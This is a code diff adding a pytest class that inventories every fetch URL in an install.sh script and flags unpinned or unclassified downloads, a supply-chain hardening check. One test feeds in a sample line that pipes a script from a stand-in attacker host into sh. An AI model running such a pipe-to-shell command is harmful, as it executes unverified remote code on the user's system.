@@ -155,6 +155,204 @@ class TestPinnedUpstreamRefs:
         assert f"${var}/" in text, f"{var} is defined but never used in a URL"
 
 
+class TestFetchSiteInventory:
+    """Enumerate every fetch site in install.sh, not every known threat.
+
+    TestPinnedUpstreamRefs above verifies the pins that exist. It cannot see a
+    fetch that was never pinned in the first place, because its regex only
+    matches raw.githubusercontent.com. That asymmetry is how three `git clone`
+    calls (tpm, zsh-autosuggestions, zsh-syntax-highlighting) and one
+    `uvx --from git+https://` (serena) came to sit outside both the pin policy
+    and its test, while the policy comment at the top of install.sh recites a
+    fetch inventory that does not mention any of them.
+
+    This test inverts the direction of enumeration: it starts from every
+    https:// URL appearing in an executable (non-comment) line of install.sh
+    and requires each one to be classified into exactly one bucket. A fetch
+    added tomorrow lands in no bucket and fails here by default -- forcing a
+    deliberate decision instead of a silent omission. That is the whole point;
+    the buckets below are bookkeeping, the fail-closed default is the guard.
+
+    What this deliberately does NOT cover, so its green is not read as more
+    than it is: package-manager installs. `go install <mod>@latest`
+    (install.sh:486, 1410, 1443, 1459, 1463) and `npm install -g <pkg>` do
+    fetch code at a floating version, but their registries verify what arrives
+    on their own -- Go checks the module against the checksum database, npm
+    against the registry's integrity hash -- so the exposure there is a moving
+    version, not unverified bytes. install.sh:70-79 scopes apt out for the same
+    reason. Folding them in would merge two different trust models into one
+    bucket and make the result harder to reason about, not easier; auditing
+    floating versions is a separate guard, not this one.
+    """
+
+    # Pins live in these variables; a URL interpolating one is pinned. A bare
+    # 40-char SHA path segment counts too, so an inline pin is not a false
+    # negative just because it skipped the variable.
+    PIN_VARS = (
+        "HOMEBREW_INSTALL_REF",
+        "LAZYDOCKER_INSTALL_REF",
+        "OHMYZSH_INSTALL_REF",
+        "VIM_PLUG_REF",
+    )
+
+    # Fetches deliberately left unpinned, with the reason install.sh:52-56
+    # gives: these vendor redirectors expose no immutable ref, so pinning them
+    # would mean a content hash re-pinned on every upstream release.
+    UNPINNED_BY_DESIGN = {
+        "https://astral.sh/uv/install.sh": "vendor redirector, no immutable ref",
+        "https://pyenv.run": "vendor redirector, no immutable ref",
+        "https://get.docker.com": "vendor redirector, no immutable ref (runs via sudo sh)",
+        "https://deb.nodesource.com/setup_lts.x": (
+            "vendor redirector, no immutable ref (runs via sudo -E bash)"
+        ),
+        # apt keyring / repository URLs. install.sh:70-79 scopes these out as a
+        # separate trust path: dearmoring a key or adding a sources.list entry
+        # is not the same as executing fetched bytes, and pinning a raw
+        # GitHub ref would not address either.
+        "https://apt.fury.io/wez/gpg.key": "apt keyring, separate trust path",
+        "https://apt.fury.io/wez/": "apt repository, separate trust path",
+        "https://cli.github.com/packages/githubcli-archive-keyring.gpg": (
+            "apt keyring, separate trust path"
+        ),
+        "https://cli.github.com/packages": "apt repository, separate trust path",
+    }
+
+    # Unpinned fetches that are NOT a considered decision -- they were simply
+    # never counted. Kept separate from UNPINNED_BY_DESIGN on purpose: this
+    # bucket is a worklist, not a blessing. Pin an entry (or move it above with
+    # a stated reason) and delete it from here; test_open_findings_are_current
+    # fails if a listed URL is gone, so the list cannot rot into a fiction.
+    UNPINNED_OPEN_FINDINGS = {
+        "https://github.com/tmux-plugins/tpm": "git clone of branch HEAD",
+        "https://github.com/zsh-users/zsh-autosuggestions": (
+            "git clone of branch HEAD; runs on every interactive shell start"
+        ),
+        "https://github.com/zsh-users/zsh-syntax-highlighting": (
+            "git clone of branch HEAD; runs on every interactive shell start"
+        ),
+        "https://github.com/oraios/serena": (
+            "uvx --from git+https of branch HEAD; runs as an MCP server every session"
+        ),
+    }
+
+    # Editing this set is what makes a change to the open findings visible in
+    # review: growing the bucket, or swapping one finding for another without
+    # changing the count, both fail here until this literal is edited too.
+    # Being honest about its strength -- both sides are hand-maintained in this
+    # file, so this is a trip-wire that forces a second deliberate edit, not an
+    # independent check. The independent checks are the two above it:
+    # test_every_fetch_url_is_classified reads install.sh, and
+    # test_listed_urls_are_still_present fails once a listed URL is gone.
+    EXPECTED_OPEN_FINDINGS = frozenset(
+        {
+            "https://github.com/tmux-plugins/tpm",
+            "https://github.com/zsh-users/zsh-autosuggestions",
+            "https://github.com/zsh-users/zsh-syntax-highlighting",
+            "https://github.com/oraios/serena",
+        }
+    )
+
+    # URLs that appear in executable lines but are never fetched -- printed for
+    # the user to open by hand.
+    NOT_FETCHED = {
+        "https://checkstyle.sourceforge.io/",
+        "https://github.com/google/google-java-format",
+    }
+
+    # http:// is matched too, so downgrading a fetch to plaintext cannot slip
+    # past by falling out of the pattern -- a new http:// URL lands in no
+    # bucket and fails, which is the signal worth having.
+    #
+    # Known scope limits, stated rather than papered over: a URL assembled
+    # from variables (`curl "$BASE/x.sh"`), an ssh remote
+    # (`git clone git@github.com:o/r`), or a scheme-less host is invisible
+    # here. Closing those means parsing shell, and a parser large enough to do
+    # it becomes its own bug surface -- the fetches this file actually makes
+    # are all literal URLs, and a future one that is not should be caught in
+    # review. Revisit if that stops being true.
+    URL = re.compile(r"https?://[^\s\"'|)\\]+")
+
+    @classmethod
+    def _urls_in_executable_lines(cls, text: str) -> dict[str, int]:
+        """Map each https:// URL to the first executable line it appears on.
+
+        Comment-only lines are skipped so the pin-refresh recipe and the policy
+        prose at install.sh:35-79 do not register as fetches. Lines with a
+        trailing comment are NOT stripped: erring toward including a URL keeps
+        this fail-closed, which is the property worth protecting.
+        """
+        found: dict[str, int] = {}
+        for lineno, line in enumerate(text.splitlines(), 1):
+            if line.lstrip().startswith("#"):
+                continue
+            for raw in cls.URL.findall(line):
+                found.setdefault(raw.rstrip(".,;"), lineno)
+        return found
+
+    @classmethod
+    def _is_pinned(cls, url: str) -> bool:
+        # Keep a pinned URL on one line. Wrapping one across a `\` continuation
+        # truncates the fragment this sees, so the pin stops being recognised
+        # and the URL starts failing as unclassified -- a confusing way to
+        # learn that reformatting broke nothing real.
+        if any(f"${var}/" in url for var in cls.PIN_VARS):
+            return True
+        return bool(re.search(r"/[0-9a-f]{40}(/|$)", url))
+
+    def test_every_fetch_url_is_classified(self):
+        found = self._urls_in_executable_lines(INSTALL.read_text(encoding="utf-8"))
+        known = (
+            set(self.UNPINNED_BY_DESIGN)
+            | set(self.UNPINNED_OPEN_FINDINGS)
+            | self.NOT_FETCHED
+        )
+        unclassified = {
+            url: line
+            for url, line in found.items()
+            if not self._is_pinned(url) and url not in known
+        }
+        assert not unclassified, (
+            "install.sh fetches a URL this inventory does not account for: "
+            + ", ".join(
+                f"{url} (install.sh:{line})"
+                for url, line in sorted(unclassified.items())
+            )
+            + ". Pin it, or add it to UNPINNED_BY_DESIGN with a reason, or to "
+            "NOT_FETCHED if it is only printed."
+        )
+
+    def test_open_findings_match_the_reviewed_set(self):
+        assert set(self.UNPINNED_OPEN_FINDINGS) == self.EXPECTED_OPEN_FINDINGS, (
+            "the open-findings bucket changed; pin the fetch instead of filing it "
+            "here if you can, and update EXPECTED_OPEN_FINDINGS deliberately if you cannot"
+        )
+
+    @pytest.mark.parametrize("bucket", ["UNPINNED_BY_DESIGN", "UNPINNED_OPEN_FINDINGS"])
+    def test_listed_urls_are_still_present(self, bucket):
+        # A bucket entry for a URL install.sh no longer fetches reads as a live
+        # exception while covering nothing, and hides that the finding was fixed.
+        text = INSTALL.read_text(encoding="utf-8")
+        for url in getattr(self, bucket):
+            assert url in text, (
+                f"{bucket} lists {url}, which install.sh no longer references"
+            )
+
+    def test_detects_an_unaccounted_fetch(self):
+        # The guard has to fail on something it has never seen, or the green
+        # above only proves the buckets match today's file.
+        snippet = "curl -fsSL https://evil.example.com/x.sh | sh\n# https://commented.example.com\n"
+        found = self._urls_in_executable_lines(snippet)
+        assert found == {"https://evil.example.com/x.sh": 1}
+        assert not self._is_pinned("https://evil.example.com/x.sh")
+
+    def test_recognises_both_pin_forms(self):
+        assert self._is_pinned(
+            "https://raw.githubusercontent.com/junegunn/vim-plug/$VIM_PLUG_REF/plug.vim"
+        )
+        assert self._is_pinned("https://example.com/" + "a" * 40 + "/install.sh")
+        assert not self._is_pinned("https://example.com/master/install.sh")
+
+
 class TestDetectOs:
     def test_darwin_is_macos(self, shell_env):
         # OSTYPE を明示して host OS に依存しない（Linux CI 上でも成立させる）
